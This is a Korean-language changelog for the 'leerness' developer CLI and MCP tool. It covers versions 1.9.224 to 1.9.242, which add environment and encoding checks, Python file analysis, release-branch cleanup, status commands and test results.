- `envInfo`: os / isKoreanWindows / codepage / nodeVersion / shellScriptsScanned / encodingRiskCount / encodingRiskFiles[0..5]
- 외부 AI 가 환경 컨텍스트 + 인코딩 위험을 단일 호출에서 회수

### 3. drift check --auto-fix env encoding BOM 통합
- 1.9.82 보안 회복 + 1.9.225 delivered + 1.9.236 release cleanup 자동 회복 패턴 확장
- `drift check --auto-fix` 시 셸 스크립트 위험 자동 BOM 추가
- log: `🌐 --auto-fix 활성 (1.9.242) — 셸 스크립트 인코딩 위험 N건 BOM 자동 추가 중...`

### 4. 누적 회귀 (1.9.207~241) — 모두 유지
- MCP 69 도구 유지 (1.9.242 는 신규 CLI 옵션 + 통합, 도구 증가 X)
- handoff JSON: userRequestsAudit + preWakeAudit + idempotencyAudit + abnormalShutdown + deliveredRequests + roundHistory + milestones + recentChanges + pyFiles + **envInfo** (10)

### 5. stress-v187 — **22/22 PASS · 100%**
- 1.9.242 (8): VERSION + env --apply (격리) + --auto-fix-bom 별칭 + handoff/session close/health 10필드 envInfo + drift --auto-fix BOM 통합 + envInfo 스키마
- 성능 (2): cold_start avg 371ms · env --apply 372ms
- 누적 회귀 (12): 1.9.207~241

### 6. 자동 release (104 라운드 main-push streak · 65 라운드 npm publish streak)

🌐 **UR-0014 완전 자동화** — 감지 (1.9.241) → 자동 수정 (1.9.242)

---

## 1.9.241 — 2026-05-24

**🌐 leerness env + 한국어 PowerShell 인코딩 위험 사전 감지 (사용자 명시 UR-0014).**

### 사용자 명시 (UR-0014)
> *"leerness 설치 프로젝트에서 PowerShell/터미널 한국어 인코딩 오류 사전 감지 — OS/언어설정/하드웨어/터미널/SW 버전 데이터 숙지로 개발/테스트/디버깅 시 환경 호환성 보장"*

배경: 사용자가 `3d-map-maker` 프로젝트에서 `npm run setup` → `setup.ps1` 파싱 오류 (한국어 + BOM 없는 UTF-8 → PowerShell CP949 오인식)

### 1. `leerness env summary` 새 명령 (1.9.145 envCheck 와 별개)
- 환경 종합 출력: OS / Node / Locale / 한국어 Windows 감지 / Hardware / Terminal (PowerShell 버전) / Tools (git/npm/python)
- `chcp` 출력으로 코드페이지 자동 감지 (949 = 한국어)
- `--json` 옵션
- 신규 helper: `_collectRuntimeEnv()` (기존 `_detectEnvironment` 와 명명 분리)

### 2. `leerness env encoding` 새 명령 — 셸 스크립트 인코딩 위험 감지
- `.ps1` / `.bat` / `.cmd` / `.sh` 자동 스캔
- BOM 없는 비-ASCII 바이트 검출 (재귀, 4096 byte 이내)
- 위험 시: `Windows 한국어 PowerShell 에서 CP949 로 오인식 가능 (BOM 추가 권장)`
- 해결책 자동 제시 (UTF-8 BOM 추가 또는 `$OutputEncoding` 설정)

### 3. handoff body 자동 노출
- `## ⚠ 셸 스크립트 인코딩 위험 N건 (1.9.241, UR-0014)` 본문 섹션
- top 3 위험 파일 + 해결 안내 (BOM 추가)
- `leerness env encoding` 가이드 자동

### 4. MCP 69번째 도구 — `leerness_env_info`
- 외부 AI 가 환경 호환성 사전 인지 → 인코딩 오류 예방
- `encodingCheck: true` 옵션 시 셸 스크립트 스캔
- MCP 68 → **69** (+1)

### 5. 누적 회귀 (1.9.207~240) — 모두 유지
- 기존 `_detectEnvironment(root)` (1.9.145) 와 충돌 없이 공존

### 6. stress-v186 — 16/16 PASS
- 1.9.241 (7): VERSION + env summary + JSON + encoding 위험 감지 + 안전 시 위험 0 + handoff body + MCP 69
- 성능 (1): cold_start avg 598ms
- 누적 회귀 (8): 1.9.207~240

### 7. 자동 release (103 라운드 main-push streak · 64 라운드 npm publish streak)

🌐 **한국어 Windows 환경 호환성 보강** — 사용자 보고 .ps1 파싱 오류 같은 케이스 사전 감지

---

## 1.9.240 — 2026-05-24

**🐍 UR-0013 2단계: handoff/session close/health --json pyFiles (9 필드) + 헤드라인 자동.**

### 1. handoff/session close/health --json 9번째 통합 필드 `pyFiles`
- Python 파일 자동 detect (1.9.239 `_collectPyFiles` 재사용)
- 형식: `{ total, analyzed, totalLOC, totalImports, totalFuncs, totalClasses }`
- 3 명령 일관성 매트릭스 진화: 7 → 8 → **9 필드** (3 × 9 = 27 통합 포인트)
- AI 가 다중 언어 워크스페이스 (.md + .py) 인지

### 2. handoff 헤드라인 18번째 요소
- `.py` 파일 ≥ 1 시: `🐍 py N` 자동 노출
- 0개일 때 미노출 (조용함)

### 3. UR-0013 2단계 완료
- 1.9.239 1단계: py-check CLI + agent-mode CLI + MCP 67/68
- **1.9.240 2단계**: JSON 9 필드 + 헤드라인 자동
- 다중 언어 표면 (.md + .py) 자동 가시화

### 4. 누적 회귀 (1.9.207~239) — 모두 유지

### 5. stress-v185 — 16/16 PASS
- 1.9.240 (7): VERSION + handoff/session close/health JSON + 9 필드 + 헤드라인 (있음/없음)
- 성능 (1): cold_start avg 386ms
- 누적 회귀 (8): 1.9.207~239

### 6. 자동 release (102 라운드 main-push streak · 63 라운드 npm publish streak)

🐍 **다중 언어 표면 가시화** — .md + .py 자동 통합 (외부 AI 가 두 표면 모두 회수)

---

## 1.9.239 — 2026-05-24

**🐍 leerness py-check + 🤖 agent-mode + MCP 67/68 (사용자 명시 UR-0013).**

### 사용자 명시 (UR-0013)
> *"leerness가 md뿐만 아니라 py를 포함한 파이썬 스크립트 등이 효율적이라거나, 에이전트 모드를 위한 장치 등 더 효율적으로 작동할 수 있도록 구현"*

### 1. `leerness py-check` 새 명령 — Python 파일 분석
- 의존성 0, regex fallback (Node 내장만)
- 분석: 파일 수 / LOC / imports / functions / classes / TODO/FIXME
- Top 5 파일 (LOC 기준)
- `--json` 옵션 (외부 자동화)
- `.harness` / `node_modules` / `venv` / `__pycache__` 등 자동 skip
- leerness 가 .md 외에도 **.py 인지** — 다중 언어 워크스페이스 지원

### 2. `leerness agent-mode <start|tick|stop>` — 자율 모드 전용 통합
- **start**: handoff + drift --auto-fix + session-resume --auto-fix (진입 자동화)
- **tick**: pulse 한 줄 (매 라운드 가벼움)
- **stop**: session close --auto-apply-delivered --auto-cleanup-branches (마감 통합)
- AI 자율 라운드 진입/매 라운드/마감을 **1 명령으로 압축** → 호출 비용 절감

### 3. MCP 67/68번째 도구
- `leerness_py_check` — 외부 AI 가 Python 표면 분석
- `leerness_agent_mode` — 외부 AI 가 자율 모드 단일 호출
- MCP 66 → 68 (+2)

### 4. 검증 — 실 Python 파일 (격리)
- 2 파일 → 22 LOC / 4 imports / 4 funcs / 2 classes / 2 TODOs (정확 회수)
- 200 file limit 안전 가드 + heavy dir skip

### 5. 누적 회귀 (1.9.207~238) — 모두 유지

### 6. stress-v184 — 18/18 PASS
- 1.9.239 (8): VERSION + py-check (격리/human/fallback) + agent-mode (help/tick) + MCP 68 + 실 호출
- 성능 (2): cold_start avg 372ms / py-check 387ms
- 누적 회귀 (8): 1.9.207~238

### 7. 자동 release (101 라운드 main-push streak · 62 라운드 npm publish streak)

🐍 **leerness 다중 언어 지원 신설** — .md → .md + .py (확장 가능 베이스)
🤖 **agent-mode 통합** — 자율 모드 진입/매라운드/마감을 3 명령으로 단축

---

## 1.9.238 — 2026-05-24

**🎉 R100 main-push streak 달성 + CLAUDE/AGENTS/session-workflow drift 차단 (1.9.228~237 9 라운드 누적).**

### 1. CLAUDE.md drift 차단 갱신 (1.9.228~237 — 10 버전 통합)
- 신규 섹션: "가시화 + 자동화 9 라운드 (1.9.228~237)"
- 9 라운드 개별 항목 + 자율 모드 마일스톤 요약

### 2. AGENTS.md drift 차단 갱신
- "라운드 진행도 가시화 (1.9.226~234)" 섹션 확장 (8 필드 / MCP 66 / 51 CLI)
- "release cleanup 생태계 (1.9.235~237 — 3 라운드 완성)" 신규 섹션

### 3. session-workflow.md drift 차단 갱신
- "라운드 진행도 가시화 + 상태 명령 (1.9.226~234)" — 4 신규 명령
- "JSON 통합 매트릭스 8 필드 (1.9.218~234)" — 진화 history
- "release cleanup 생태계 (1.9.235~237)" — 3 라운드 완성

### 4. 🎉 R100 main-push streak 달성 (1.9.140 → 1.9.238)
- 1.9.140 (main 자동 push) 사용자 명시 부터 시작
- 100 라운드 연속 무손실 자동 commit + tag + push + main sync
- 1.9.178 부터 npm publish 자동 통합 (61 라운드 연속)

### 5. 누적 회귀 (1.9.207~237) — 모두 유지

### 6. stress-v183 — 13/13 PASS
- 1.9.238 (4): VERSION + CLAUDE 10 버전 + AGENTS 갱신 + session-workflow 갱신
- 성능 (1): cold_start avg 312ms
- 종합 누적 회귀 (8): 1.9.207~237 모든 시스템

### 7. 자동 release (100 라운드 main-push streak 🎉 · 61 라운드 npm publish streak)

🎉 **R100 main-push streak 달성** — leerness 자체가 안정성 검증 인스턴스

---

## 1.9.237 — 2026-05-24

**🗑 session close --auto-cleanup-branches + handoff body 50+ branches 경고.**

### 1. `session close --auto-cleanup-branches` 옵션 (1.9.224 패턴 확장)
- 50+ release/* merged branches 시 자동 정리 (keep 10)
- 안전: 1.9.235 가드 (merged 만, 현재 branch 보호)
- `--auto-apply-delivered` (1.9.224) 와 동일한 자율 모드 패턴

### 2. handoff body 50+ branches 경고 자동 노출
- `## 🗑 release/* branches 누적 N개 (50+) (1.9.237)` 본문 섹션 자동
- 3 가지 정리 옵션 자동 안내:
  - 수동: `leerness release cleanup --apply --keep 10`
  - 마감 자동: `session close --auto-cleanup-branches`
  - drift 자동: `drift check --auto-fix` (1.9.236)
- AI/사용자 누적 폐기물 가시화

### 3. release cleanup 생태계 완성 (3 라운드 누적)
| 라운드 | 기능 |
|---|---|
| 1.9.235 | CLI 신설 (수동) |
| 1.9.236 | MCP 66 + drift --auto-fix 통합 |
| **1.9.237** | **session close 자동 + handoff body 경고** ⭐ |

### 4. 누적 회귀 (1.9.207~236) — 모두 유지

### 5. stress-v182 — 15/15 PASS
- 1.9.237 (5): VERSION + flag 코드 + session close 안내 + handoff body 경고 + 격리 no-warning
- 성능 (2): cold_start avg 387ms / handoff 4706ms
- 누적 회귀 (8): 1.9.207~236

### 6. 자동 release (99 라운드 main-push streak · 60 라운드 npm publish streak 🎉)

🎉 **60 라운드 npm publish streak 달성** + 1 라운드 후 **R100 main-push streak 도달**

---

## 1.9.236 — 2026-05-24

**🔌 MCP 66번째 도구 (release_cleanup) + drift check --auto-fix 통합 (50+ branches 자동 정리).**

### 1. MCP 66번째 도구 — `leerness_release_cleanup`
- 1.9.235 release cleanup CLI 를 외부 AI 에 노출
- 인자: `{ path?, apply? (default false), keep? (default 5) }`
- 응답: `{ apply, keep, total, merged, unmerged, deleteCount, toDelete[], recent[], unmergedSample[] }`
- MCP 65 → **66** (+1)

### 2. `drift check --auto-fix` release cleanup 통합 (1.9.82/225 패턴 확장)
- merged `release/*` branches 50개 초과 시 자동 정리
- 안전: keep 10 (최근 10개 유지), merged 만 삭제 (unmerged 보호)
- 1.9.82 audit --fix → 1.9.225 delivered → 1.9.236 release cleanup (3 라운드 누적)

### 3. drift 회복 시스템 확장 매트릭스 (4 자동 회복 통합)
| 라운드 | 신호 | 자동 회복 |
|---|---|---|
| 1.9.39 | critical | session close 자동 |
| 1.9.82 | 보안 | audit --fix |
| 1.9.225 | delivered | requests 자동 완료 |
| **1.9.236** | **release-branch** | **release cleanup --keep 10** ⭐ |

### 4. 누적 회귀 (1.9.207~235) — 모두 유지

### 5. stress-v181 — 15/15 PASS
- 1.9.236 (5): VERSION + MCP 66 등록 + 실 호출 + keep 파라미터 + drift 통합 코드
- 성능 (2): cold_start avg 389ms / MCP 66 tools/list 363ms
- 누적 회귀 (8): 1.9.207~235

### 6. 자동 release (98 라운드 main-push streak · 59 라운드 npm publish streak)

🔌 **drift 자동 회복 4 통합** — leerness 가 스스로 누적 폐기물 정리

---

## 1.9.235 — 2026-05-23

**🗑 leerness release cleanup CLI — local release/* branches 정리 + --keep BUG fix.**

### 1. `leerness release cleanup` 새 명령
- local `release/*` branches 중 main 에 merge된 것 자동 정리
- 기본 dry-run (목록만), `--apply` 명시 시 실 삭제
- `--keep N` (default 5) — 최근 N개 유지
- 안전 가드: merged 만 삭제, unmerged 보호, 현재 branch 보호
- `--json` 옵션

### 2. 실 측정 — leerness 자체 누적 191개
- merged: 191개 / unmerged: 0개
- keep 5 → 삭제 후보 186개 (1.9.6~229)
- 유지: 1.9.234, 1.9.233, 1.9.232, 1.9.231, 1.9.230 (top 5 최신)
- handoff abnormal-shutdown `release-branch-pending` 신호 가중치 해소 가능

### 3. 🐛 `--keep` 플래그 nonFlagArgs 등록 (BUG fix)
- 기존: `--keep 10`의 `10`이 non-flag arg 로 잘못 분류 → root 인자 됨
- 1.9.235 fix: `withValue.Set` 에 `--keep` 추가 → 정상 인식

### 4. 누적 회귀 (1.9.207~234) — 모두 유지

### 5. stress-v180 — 16/16 PASS
- 1.9.235 (7): VERSION + dry-run + --keep + 정렬 + 안전 가드 + git fallback + human 출력
- 성능 (2): cold_start avg 353ms / release cleanup 701ms
- 누적 회귀 (7): 1.9.207~234

### 6. 자동 release (97 라운드 main-push streak · 58 라운드 npm publish streak)

🗑 **운영 누적 정리 시스템** — 191 branches 누적 → 5개 유지 가능 (handoff 신호 해소)

---

## 1.9.234 — 2026-05-23

**📜 handoff/session close/health --json recentChanges 통합 (8 필드 완성) — 외부 AI 최근 5 라운드 즉시 인지.**

### 1. handoff/session close/health --json 8번째 통합 필드 `recentChanges`
- git tag 기반 최근 5 라운드의 핵심 변경 자동 회수
- 형식: `[{ version, date, subject }]` (가장 최근부터)
- AI 가 "최근 무엇이 바뀌었나?"를 단일 호출로 인지 → 컨텍스트 절약
- 1.9.218 (4 필드) → 1.9.223 (5) → 1.9.227 (6) → 1.9.230 (7) → 1.9.234 (**8 필드**)

### 2. 3 명령 일관성 매트릭스 — 3 × 8 = 24 통합 포인트
- handoff/session close/health 동일 형식 + 동일 결과
- 외부 자동화/CI 어느 명령으로 조회해도 동일 응답

### 3. AI 인지 비용 절감
- 기존: AI 가 CHANGELOG.md 읽기 → 토큰 다량 소비
- 1.9.234: handoff --json 한 번에 최근 5 라운드 자동 회수 → ~500 토큰 절약

### 4. 누적 회귀 (1.9.207~233) — 모두 유지

### 5. stress-v179 — 17/17 PASS
- 1.9.234 (7): VERSION + handoff/session close/health JSON + 3 명령 일관성 + 8 필드 검증 + 형태 검증
- 성능 (2): cold_start avg 376ms / handoff --json (8 필드) 1109ms
- 누적 회귀 (8): 1.9.207~233

### 6. 자동 release (96 라운드 main-push streak · 57 라운드 npm publish streak)

📜 **JSON 통합 매트릭스 8 필드 완성** — 외부 AI 가 leerness 상태 + 최근 변경 모두 한 번에 회수

---

## 1.9.233 — 2026-05-23

**📚 leerness commands 새 명령 (9 카테고리 51 CLI) + MCP 65번째 도구.**

### 1. `leerness commands` 새 명령 — 카테고리화된 전체 CLI 목록
- **9 카테고리 · 51 명령** 한 눈에:
  - status (8) — handoff/health/pulse/round-history/milestones/session-resume/which/memory status
  - task (5) — add/update/drop/export + next-action
  - memory (4) — decision/rule/plan/lesson CRUD
  - audit (10) — audit/drift/scan secrets/encoding/lazy/verify-claim/optimism/requests/pre-wake/idempotency
  - workflow (7) — session close/resume/route/agents/review-request/review/brainstorm
  - release (3) — sync-main/pack/publish
  - skill (2) — list/info/learn/use/optimize/match/suggest + install/install-top/publish/search/discover
  - bridge (3) — web/pc/lsp
  - config (9) — init/migrate/update/wakeup-interval/workspace-dir/intent/constraints/provider/commands
- `--json` 옵션 (외부 자동화)

### 2. MCP 65번째 도구 — `leerness_commands`
- 외부 AI 가 전체 CLI 목록을 직접 회수 → 매뉴얼/도움말 동적 생성
- MCP 64 → 65 (+1)

### 3. 실 측정 — leerness 전체 표면 가시화
- 9 카테고리 × 평균 5.7 명령 = **51 CLI 명령**
- handoff/health/pulse 등 핵심 status 명령은 status 카테고리에 그룹화

### 4. 누적 회귀 (1.9.207~232) — 모두 유지

### 5. stress-v178 — 16/16 PASS
- 1.9.233 (6): VERSION + CLI + --json 카테고리 검증 + human 출력 + MCP 65 + 실 호출
- 성능 (2): cold_start avg 413ms / commands 390ms (정적 데이터, 빠름)
- 누적 회귀 (8): 1.9.207~232

### 6. 자동 release (95 라운드 main-push streak · 56 라운드 npm publish streak)

📚 **전체 표면 가시화** — 9 카테고리 × 51 CLI × 65 MCP 도구 한눈에

---

## 1.9.232 — 2026-05-23

**🐛 pulse memorySurface BUG fix + handoff --pulse 옵션 + session close 자동 pulse.**

### 1. pulse memorySurface BUG fix (1.9.231 → 1.9.232)
- 1.9.231 pulse 의 T/D/R/P/L 카운트가 잘못된 정규식으로 늘 0 출력
- 1.9.232: `memoryStatusCmd` 와 동일한 패턴 사용 (`readProgressRows`, `_extractDecisionBlocks`, `readRules`, `### M-` regex, `### YYYY-MM-DD` regex)
- 검증: leerness-pkg → 기존 `T0/D0/R0/P0/L0` → 정상 `T0/D0/R1/P1/L0` (active rule + milestone 반영)

### 2. `leerness handoff --pulse` 옵션 신설
- handoff 대신 pulse 1 line 형식 출력
- AI 가 빠른 상태 확인 시 사용 (`handoff` 전체 호출 대신)
- 내부: `pulseCmd` 직접 호출

### 3. session close 자동 pulse 한 줄 노출
- 마감 시 1.9.217 통합 보고 끝에 pulse 한 줄 자동 추가
- 다음 라운드 진입 시 즉시 상태 인지: `📍 v1.9.232 · 🔄 R188 · 🧠 T0/D0/R1/P1/L0 · 🎯 R200 (1d)`
- AI 가 한 줄로 컨텍스트 확보

### 4. 누적 회귀 (1.9.207~231) — 모두 유지

### 5. stress-v177 — 13/13 PASS
- 1.9.232 (4): VERSION + pulse BUG fix + handoff --pulse + session close 자동 pulse
- 성능 (2): cold_start avg 389ms / pulse 1009ms
- 누적 회귀 (7): 1.9.207~231

### 6. 자동 release (94 라운드 main-push streak · 55 라운드 npm publish streak)

🐛 **1 라운드 BUG fix + 2 UX 개선** — pulse 시스템 안정성 강화

---

## 1.9.231 — 2026-05-23

**📍 leerness pulse 새 명령 (한 줄 종합 요약) + MCP 64번째 도구.**

### 1. `leerness pulse` 새 명령 — 한 줄 종합 요약
- 10 핵심 지표를 1 line으로: `📍 v1.9.231 · 🔄 R187 · 🔌 MCP 64 · 🧠 T0/D0/R0/P0/L0 · 🎯 R200 (1d) · 🔌 abnormal:medium`
- `--json` 옵션: `{ version, roundCount, mcpTools, memorySurface, security, health, driftScore, nextMilestone, etaDays, abnormalShutdown }`
- **handoff 보다 가벼움**: drift/health 계산 skip → 더 빠름

### 2. MCP 64번째 도구 — `leerness_pulse`
- 외부 AI가 가벼운 단일 호출로 leerness 전체 상태 회수
- 1.9.230 (62) → 1.9.231 (**64**, +1)

### 3. 실 측정 — leerness 자체 pulse
- 👁 한눈에 보기: R187 / MCP 64 / R200 ETA 1d / abnormal:medium
- handoff (~1019ms) → pulse (~945ms) — 더 빠르게 핵심만

### 4. 누적 회귀 (1.9.207~230) — 모두 유지

### 5. stress-v176 — 16/16 PASS
- 1.9.231 (6): VERSION + CLI 한 줄 + --json + git fallback + MCP 64 + 실 호출
- 성능 (2): cold_start avg 394ms / pulse 945ms
- 누적 회귀 (8): 1.9.207~230

### 6. 자동 release (93 라운드 main-push streak · 54 라운드 npm publish streak)

📍 **빠른 상태 확인 명령 신설** — pulse 가 handoff보다 가벼워서 자동화에 최적

---

## 1.9.230 — 2026-05-23

**📊 handoff/session close/health --json milestones 통합 (7 필드 완성) + 헤드라인 ETA 임박 표시.**

### 1. handoff/session close/health --json 7번째 통합 필드 `milestones`
- 1.9.229 milestones 데이터를 JSON 3 명령 모두에 통합
- 동일 형식: `{ reachedCount, reached: [{milestone, version, reachedAt}], next, avgRoundsPerDay }`
- 1.9.218 (4 필드) → 1.9.223 (5) → 1.9.227 (6) → 1.9.230 (**7 필드**)

### 2. 3 명령 milestones 동일 형식 일관성
- handoff/session close/health 모두 동일한 `milestones` 객체 반환
- 외부 자동화/CI 가 어느 명령으로 조회해도 동일 결과
- 일관성 매트릭스: 3 명령 × 7 필드 = **21 통합 포인트**

### 3. handoff 헤드라인 임박 ETA 표시 (1.9.230)
- 다음 마일스톤이 **10R 이내** + ETA가 **7일 이내** 일 때만 별도 노출
- `🎯 R200 ETA 2026-05-24` 형식 (현재는 14R 남아 보호 가드 발동 X)
- 마일스톤 임박 시 자동 강조 (스팸 방지: 조건 충족 시만)

### 4. 누적 회귀 (1.9.207~229) — 모두 유지

### 5. stress-v175 — 17/17 PASS
- 1.9.230 (7): VERSION + handoff/session close/health JSON + 3 명령 일관성 + 7 필드 검증 + 헤드라인 ETA
- 성능 (2): cold_start avg 439ms / handoff --json (7 필드) 1019ms
- 누적 회귀 (8): 1.9.207~229

### 6. 자동 release (92 라운드 main-push streak · 53 라운드 npm publish streak)

📊 **JSON 통합 매트릭스 7 필드 완성** — 외부 자동화가 leerness 상태를 7 차원 동기 회수 (3 명령 일관성)

---

## 1.9.229 — 2026-05-23

**🎯 leerness milestones CLI + MCP 63번째 도구 (도달 마일스톤 + ETA 예측).**

### 1. `leerness milestones` 새 명령
- git tag 순차 분석으로 25/50/75/100/125/150/175/200/250/300/400/500 마일스톤 도달 시점 회수
- 각 마일스톤별: `{milestone, version, reachedAt, daysFromBaseline}`
- 다음 마일스톤 ETA 계산 (현재 속도 기준): `{milestone, roundsRemaining, etaDays, etaDate}`
- `--json` 옵션
- 1.9.226 round-history 확장 (간단 통계 → 도달 이력 + ETA)

### 2. MCP 63번째 도구 — `leerness_milestones`
- 외부 AI가 "프로젝트 마일스톤 진척도 + 다음 달성 예상일" 직접 회수
- MCP 62 → 63 (+1)

### 3. 실 측정 — leerness 자체 마일스톤 이력 (7개 달성)
- R25 → v1.9.68 (2026-05-19, +11d)
- R50 → v1.9.93 (2026-05-20, +11d)
- R75 → v1.9.118 (2026-05-20, +11d)
- R100 → v1.9.143 (2026-05-20, +11d)
- R125 → v1.9.168 (2026-05-20, +12d)
- R150 → v1.9.193 (2026-05-21, +12d)
- R175 → v1.9.218 (2026-05-22, +14d)
- **다음: R200** — 2026-05-24 ETA (15 라운드 남음, ~2일 후)

### 4. 누적 회귀 (1.9.207~228) — 모두 유지

### 5. stress-v174 — 17/17 PASS
- 1.9.229 (7): VERSION + CLI + reached 형태 + next ETA + git fallback + MCP 63 + 실 호출
- 성능 (2): cold_start avg 442ms / milestones 717ms
- 누적 회귀 (8): 1.9.207~228

### 6. 자동 release (91 라운드 main-push streak · 52 라운드 npm publish streak)

🎯 **자율 모드 진척도 시각화 완성** — 도달 이력 + 예측 ETA 모두 가시화

---

## 1.9.228 — 2026-05-23

**📊 health --json roundHistory 통합 (JSON 3 명령 일관성) + session-workflow.md drift 차단 + 헤드라인 label 갱신.**

### 1. health --json `roundHistory` 필드 통합
- handoff/session close에 이어 health도 통합 → **JSON 3 명령 일관성**
- `{ roundCount, baselineVersion, nextMilestone, roundsToNextMilestone, daysActive, avgRoundsPerDay }`
- 외부 자동화가 health 단일 호출로 진행도까지 회수

### 2. session-workflow.md drift 차단 갱신 (1.9.220~228)
- 신규 섹션 4개:
  - 비정상 종료 자율 재개 (1.9.220~222)
  - 사용자 요청 자동 완료 (1.9.223~225)
  - 라운드 진행도 가시화 (1.9.226~228)
  - JSON 통합 매트릭스 (handoff/session close 6 필드)
- 마지막 업데이트 1.9.171 → 1.9.228 (57 라운드 누적 정리)

### 3. handoff 헤드라인 label list 갱신
- 기존: `(1.9.81/93/113/152/162/192/197/204/207/209/215/220)` (12 버전)
- 신규: `(1.9.81/93/113/152/162/192/197/204/207/209/215/220/223/226)` (**14 버전**, +1.9.223 delivered-requests, +1.9.226 round-counter)
- AI가 헤드라인 출처 추적하기 쉬움 (메타 가시성)

### 4. 누적 회귀 (1.9.207~227) — 모두 유지

### 5. stress-v173 — 15/15 PASS
- 1.9.228 (5): VERSION + health roundHistory + 3 명령 일관성 + 헤드라인 label + session-workflow.md
- 성능 (2): cold_start avg 414ms / health --json 1132ms
- 누적 회귀 (8): 1.9.207~227

### 6. 자동 release (90 라운드 main-push streak · 51 라운드 npm publish streak)

📊 **JSON 일관성 매트릭스 완성** (handoff/session close/health 3 명령 — `roundHistory` 필드 동일 형식)

---

## 1.9.227 — 2026-05-23

**📊 handoff/session close --json roundHistory 통합 (6 필드 완성) + CLAUDE/AGENTS drift 차단.**

### 1. handoff --json 6번째 통합 필드 `roundHistory`
- `{ roundCount, baselineVersion, nextMilestone, roundsToNextMilestone, daysActive, avgRoundsPerDay }`
- 외부 CI/모니터링이 라운드 진행도 + 다음 마일스톤 직접 회수
- 1.9.218 (4 필드) → 1.9.223 (5 필드) → 1.9.227 (**6 필드 완성**)

### 2. session close --json 6번째 통합 필드 `roundHistory`
- 마감 시 진행도 통계 동기 노출
- handoff/session close JSON 동일 패턴 유지

### 3. CLAUDE.md / AGENTS.md drift 차단 갱신
- 1.9.222~227 6 라운드 누적 통합 (이전 갱신: 1.9.214)
- 신규 섹션: "사용자 요청 자동 완료 시스템 (1.9.223~225)" + "라운드 진행도 가시화 (1.9.226~227)"
- 새 메타파일 (last update: 1.9.214 → 1.9.227, 6 라운드 누적)

### 4. 6 통합 필드 매트릭스 완성 (handoff/session close --json 일관성)
- userRequestsAudit (1.9.207/218)
- preWakeAudit (1.9.209/218)
- idempotencyAudit (1.9.212/218)
- abnormalShutdown (1.9.220/221)
- deliveredRequests (1.9.223)
- **roundHistory** (1.9.226/227) ⭐

### 5. 누적 회귀 (1.9.207~226) — 모두 유지

### 6. stress-v172 — 17/17 PASS
- 1.9.227 (7): VERSION + handoff JSON + session close JSON + 6 필드 검증 (handoff) + 6 필드 검증 (session close) + CLAUDE 누적 + AGENTS 누적
- 성능 (2): cold_start avg 400ms / handoff --json 641ms
- 누적 회귀 (8): 1.9.207~226

### 7. 자동 release (89 라운드 main-push streak · 50 라운드 npm publish streak 🎉)

📊 **JSON 통합 매트릭스 완성** — 외부 자동화/CI 가 leerness 상태 6 차원 동기 회수

🎉 **50 라운드 npm publish streak 달성**

---

## 1.9.226 — 2026-05-23

**🔄 round-history CLI + handoff 헤드라인 라운드 카운터 + MCP 62번째 도구.**

### 1. `leerness round-history` 새 명령 — 자율 라운드 통계
- git tag `v1.9.X` 기반 누적 라운드 카운트 (graceful fallback: git 없으면 0)
- 응답: `{ currentVersion, roundCount, baselineVersion, latestTags[], nextMilestone, roundsToNextMilestone, firstTagAt, latestTagAt, daysActive, avgRoundsPerDay }`
- 마일스톤 자동 감지: 50/75/100/125/150/175/200/250/300/400/500
- `--json` 옵션 (외부 자동화)

### 2. handoff 헤드라인 17번째 요소
- 5 라운드 이상 누적 시 `🔄 R<N>` 자동 노출
- 다음 마일스톤이 20 라운드 이내일 때: `🔄 R182 → R200 (18R 남음)` 강조
- 자율 모드 진행도 한눈에

### 3. MCP 62번째 도구 — `leerness_round_history`
- 외부 AI가 "이 프로젝트는 얼마나 진행됐고 다음 마일스톤까지 몇 라운드 남았나?"를 회수
- MCP 61 → 62 (+1)

### 4. 실 측정 (leerness 자체 프로젝트)
- 누적 라운드: **182R** (baseline v1.9.6 → v1.9.225)
- 활동 기간: 14일 / 평균 **13 rounds/day**
- 다음 마일스톤: **R200 (18 라운드 남음)**

### 5. 누적 회귀 (1.9.207~225) — 모두 유지

### 6. stress-v171 — 16/16 PASS
- 1.9.226 (7): VERSION + round-history CLI + --json + git 없는 fallback + handoff 헤드라인 + MCP 62 등록 + MCP 실 호출
- 성능 (2): cold_start avg 336ms / round-history 535ms
- 누적 회귀 (7): 1.9.207~225

### 7. 자동 release (88 라운드 main-push streak · 49 라운드 npm publish streak)

🔄 **자율 라운드 진행도 가시화** — handoff 한 줄에서 마일스톤 예측 가능

---

## 1.9.225 — 2026-05-22

**🔧 drift check --auto-fix delivered 통합 + LEERNESS_AUTO_APPLY_DELIVERED env opt-in.**

### 1. `drift check --auto-fix` delivered 패턴 자동 적용 (1.9.82 패턴 확장)
- 1.9.82 보안 신호 → audit --fix 자동 호출 패턴을 delivered 시스템에도 적용
- `--auto-fix` 플래그 사용 시 `_detectDeliveredRequests` → 후보 자동 완료
- `autoCompleteReason: 'drift-auto-fix-1.9.225'` 추적
- drift score 가중치 가짜 미답 신호 제거 → drift 회복 완성도 향상

### 2. `LEERNESS_AUTO_APPLY_DELIVERED=1` env opt-in (자율 모드용)
- handoff 첫 호출 시 자동 적용 (`autoCompleteReason: 'env-auto-apply-1.9.225'`)
- 자율 모드에서 매 라운드마다 자동 정리 → AI가 신경 쓸 필요 X
- env 미설정 시 기존 동작 (안내만)

### 3. handoff 본문 가이드 추가
- 1.9.224 본문 섹션에 `→ 자율 모드 자동 적용: export LEERNESS_AUTO_APPLY_DELIVERED=1` 안내
- 사용자가 자율 모드 opt-in 발견하기 쉽게

### 4. 사용자 요청 자동 완료 시스템 — 4 라운드 누적 완성
- 1.9.223 CLI auto-complete (수동 호출)
- 1.9.224 MCP 61 + handoff 본문 + session close 자동 적용
- 1.9.225 drift --auto-fix 통합 + env opt-in 자동화

### 5. 누적 회귀 (1.9.207~224) — 모두 유지

### 6. stress-v170 — 14/14 PASS
- 1.9.225 (5): VERSION + drift auto-fix 통합 + drift 기본 보존 + env auto-apply + env 없으면 미적용
- 성능 (2): cold_start avg 367ms / drift auto-fix 383ms
- 누적 회귀 (7): 1.9.207~224

### 7. 자동 release (87 라운드 main-push streak · 48 라운드 npm publish streak)

🔧 **drift 회복 시스템 누적 강화** (1.9.39/82/225 — 3 라운드)

---

## 1.9.224 — 2026-05-22

**🔌 MCP 61 도구 (leerness_requests_auto_complete) + handoff 본문 + session close --auto-apply-delivered.**

### 1. MCP 61번째 도구 — `leerness_requests_auto_complete`
- 1.9.223 delivered 패턴 자동 감지를 외부 AI에 노출
- 인자: `{ path?, apply? (default false) }`
- 응답: `{ total, candidates: [{id, text, claimedVersion, currentVersion, deliveredKeyword, recordedAt}], currentVersion, applied, completedIds[] }`
- MCP 60 (1.9.221) → 61 도구 (+1)

